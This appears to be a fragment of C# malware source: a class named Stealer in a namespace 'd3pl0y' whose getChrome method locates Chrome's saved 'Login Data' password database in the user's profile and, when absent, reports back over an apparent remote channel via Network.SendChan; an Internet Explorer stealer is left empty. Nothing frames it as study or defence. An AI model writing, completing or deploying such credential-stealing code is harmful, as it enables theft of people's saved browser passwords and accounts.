using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.IO;
namespace d3pl0y
{
    class Stealer
    {
        public static string chromePasses;
        public static string getChrome()
        {
            chromePasses = Environment.GetEnvironmentVariable("USERPROFILE") + @"\AppData\Local\Google\Chrome\User Data\Default\Login Data";
            Debug.Write(chromePasses);
            if (File.Exists(chromePasses))
            {
               
                return chromePasses;
            }
            else { Network.SendChan("Chrome login data not found"); return null; }
        }
        public static void getIE()
        {


        }
    }
}
